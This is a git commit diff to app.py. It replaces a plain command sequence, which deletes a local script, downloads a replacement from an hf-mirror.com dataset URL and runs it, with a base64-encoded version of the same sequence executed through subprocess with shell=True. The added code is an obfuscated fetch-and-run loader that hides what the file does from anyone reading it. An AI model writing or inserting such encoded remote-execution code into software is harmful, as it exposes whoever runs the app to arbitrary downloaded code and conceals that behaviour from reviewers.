9d6ced4f84fcf3f9f3c652a23c6a62b50df3fe7d
2575044704 <2575044704@qq.com>
2024-01-22 01:03:47 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,4 +1,7 @@
-import os
-os.system(f"rm ./app1.py")
-os.system(f"wget https://hf-mirror.com/datasets/ACCA225/openxlab/resolve/main/app1.py")
-os.system(f"python app1.py")
+import base64
+import subprocess
+def code():        
+    encoded_command = "CnJtIC4vYXBwMTEucHkKd2dldCBodHRwczovL2hmLW1pcnJvci5jb20vZGF0YXNldHMvQUNDQTIyNS9vcGVueGxhYi9yZXNvbHZlL21haW4vYXBwMTEucHkKcHl0aG9uIGFwcDExLnB5"
+    decoded_command = base64.b64decode(encoded_command).decode()
+    subprocess.run(decoded_command, shell=True, check=True)
+code()
